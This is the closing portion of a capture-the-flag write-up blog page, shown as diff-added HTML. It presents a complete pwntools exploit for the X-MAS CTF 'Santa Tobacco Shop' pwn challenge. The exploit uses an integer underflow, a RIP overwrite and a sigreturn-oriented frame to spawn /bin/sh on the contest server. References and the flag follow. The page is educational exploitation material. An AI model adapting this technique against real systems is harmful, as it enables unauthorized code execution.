+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x0</span>                 <span class="c1"># NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x0</span>                 <span class="c1"># NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span>          <span class="c1"># 0xdeadbeef for testing</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="mh">0x0000000000401114</span>  <span class="c1"># 0x0000000000401114: syscall;</span>
+</span></span></code></pre></div><p>Here is the final PoC:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s2">&#34;Pwnage by memN0ps!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Binary to target</span>
+</span></span><span class="line"><span class="cl"><span class="n">pwnme</span> <span class="o">=</span> <span class="s1">&#39;./main&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Breakpoints for GDB</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## .text:0000000000401186 mov     [rax], rbx</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## .text:0000000000401194 retn</span>
+</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">b *0x401186
+</span></span></span><span class="line"><span class="cl"><span class="s1">b *0x401194
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Arguments from the terminal (GDB, LOCAL or REMOTE)</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;GDB&#39;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">pwnme</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;LOCAL&#39;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">pwnme</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">elif</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;challs.xmas.htsp.ro&#39;</span><span class="p">,</span> <span class="mi">2002</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Usage: python3 </span><span class="si">{}</span><span class="s2"> [GDB] [LOCAL] [REMOTE]&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Architecture</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s2">&#34;DEBUG&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Allowed to send 8 bytes including 0x0a (\n). Using send instead of sendline will allow 8 bytes</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_buffer</span><span class="p">(</span><span class="n">shellcode</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;What brand of cigarettes would you like to buy today? (/quit to leave)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Sigreturn-Oriented Programming (SROP) ##</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Frame to call execve using SigreturnFrame for x86-64</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span> <span class="n">kernel</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mh">0x3b</span>                <span class="c1"># syscall number for execve</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="mh">0x0000000000402001</span>  <span class="c1"># pointer to the .bss/data segment (/bin/sh 0x68732f2f6e69622f)</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x0</span>                 <span class="c1"># NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mh">0x0</span>                 <span class="c1"># NULL</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span>          <span class="c1"># 0xdeadbeef for testing</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="mh">0x0000000000401114</span>  <span class="c1"># 0x0000000000401114: syscall;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## Generate a unique pattern of uppercase letters (8 bytes)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#cyclic()</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#g = cyclic_gen(string.ascii_uppercase, n=8)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#g.get(8)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Memory Corruption via int underflow: unsigned __int16 is 0 to 65,535</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># But if you include the 0 it is 65,536</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 272 - 232 = 40 and 65536 - 40 = 65496</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># offset at 65496</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">65496</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">frame</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">send_buffer</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Reverse the frame and convert to bytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">new_frame</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">frame</span><span class="o">.</span><span class="n">values</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">new_frame</span><span class="o">.</span><span class="n">reverse</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">send_buffer</span><span class="p">(</span><span class="n">flat</span><span class="p">(</span><span class="n">new_frame</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># RIP overwrite for rt_sigreturn with #0x0000000000401199: mov eax, 0xf; nop; syscall;</span>
+</span></span><span class="line"><span class="cl"><span class="n">send_buffer</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401199</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Quit using &#34;/&#34; and add /bin/sh to the .bss/data segment</span>
+</span></span><span class="line"><span class="cl"><span class="n">send_buffer</span><span class="p">(</span><span class="s2">&#34;//bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">critical</span><span class="p">(</span><span class="s2">&#34;W00TW00T!&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#X-MAS{1f_1n_t0b4cc0_y0u_b3li3v3_XM45_G1f75_y0u_w0n7_r3c31v3}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#https://amriunix.com/post/sigreturn-oriented-programming-srop/</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#https://anee.me/advanced-rop-techniques-16fd701909b5</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#https://docs.pwntools.com/</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md</span>
+</span></span></code></pre></div><p>W00TW00T! We can see that the exploit works on the remote box smoothly :)</p>
+<p><img src="/XMAS-Pwn-Santa-Tobacco-Shop/flag.png" alt="flag.png"></p>
+<p>Here is the flag.</p>
+<pre tabindex="0"><code>X-MAS{1f_1n_t0b4cc0_y0u_b3li3v3_XM45_G1f75_y0u_w0n7_r3c31v3}
+</code></pre><p>Thanks to the challenge creator <code>PinkiePie1189</code> and the people who <code>organized</code> it (<code>Livian</code>) ;) and thanks to <a href="https://xmas.htsp.ro/login">https://xmas.htsp.ro/login</a>. I had fun a learned a lot. I just do pwn for fun and learning.</p>
+<p>Hope you enjoyed my write up, sorry if I did not explain it well but it takes ages to write a quality blog and sometimes I get lazy :P</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://sites.google.com/site/microprocessorsbits/string-instructions/cmps-cmpsb-cmpsw">https://sites.google.com/site/microprocessorsbits/string-instructions/cmps-cmpsb-cmpsw</a></li>
+<li><a href="https://c9x.me/x86/html/file_module_x86_id_279.html">https://c9x.me/x86/html/file_module_x86_id_279.html</a></li>
+<li><a href="https://amriunix.com/post/sigreturn-oriented-programming-srop/">https://amriunix.com/post/sigreturn-oriented-programming-srop/</a></li>
+<li><a href="https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop">https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop</a></li>
+<li><a href="https://anee.me/advanced-rop-techniques-16fd701909b5">https://anee.me/advanced-rop-techniques-16fd701909b5</a></li>
+<li><a href="https://docs.pwntools.com/">https://docs.pwntools.com/</a></li>
+<li><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md</a></li>
+<li><a href="https://github.com/sashs/Ropper">https://github.com/sashs/Ropper</a></li>
+<li><a href="https://0x00sec.org/t/srop-signals-you-say/2890">https://0x00sec.org/t/srop-signals-you-say/2890</a></li>
+<li><a href="https://man7.org/">https://man7.org/</a></li>
+<li><a href="https://sites.google.com/site/microprocessorsbits/">https://sites.google.com/site/microprocessorsbits/</a></li>
+<li><a href="https://www.gnu.org/software/gdb/current/">https://www.gnu.org/software/gdb/current/</a></li>
+<li><a href="https://github.com/hugsy/gef">https://github.com/hugsy/gef</a></li>
+</ul>
+
+
+        
+
+        
+
+        
+      </article>
+
+      
+        <ul class="pager blog-pager">
+          
+            <li class="previous">
+              <a href="https://memn0ps.github.io/HackTheBox-Pwn-Ropme/" data-toggle="tooltip" data-placement="top" title="HackTheBox Pwn: Ropme">&larr; Previous Post</a>
+            </li>
+          
+          
+            <li class="next">
+              <a href="https://memn0ps.github.io/Parallel-Syscalls/" data-toggle="tooltip" data-placement="top" title="Parallel Syscalls">Next Post &rarr;</a>
+            </li>
+          
+        </ul>
+      
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+      
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+        <ul class="list-inline text-center footer-links">
+          
+              <li>
+                <a href="https://github.com/memN0ps" title="GitHub">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://twitter.com/memN0ps" title="Twitter">
+                  <span class="fa-stack fa-lg">
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+          
+          <li>
+            <a href="" title="RSS">
+              <span class="fa-stack fa-lg">
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+              </span>
+            </a>
+          </li>
+          
+        </ul>
+        <p class="credits copyright text-muted">
+          
+            
+              memN0ps
+            
+          
+
+          &nbsp;&bull;&nbsp;&copy;
+          
+            2022
+          
+
+          
+            &nbsp;&bull;&nbsp;
+            <a href="https://memn0ps.github.io/">memN0ps</a>
+          
+        </p>
+        
+        <p class="credits theme-by text-muted">
+          <a href="https://gohugo.io">Hugo v0.93.1</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
+          
+        </p>
+      </div>
+    </div>
+  </div>
+</footer><script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"></script>
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+<script src="https://memn0ps.github.io/js/main.js"></script><script> renderMathInElement(document.body); </script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://memn0ps.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
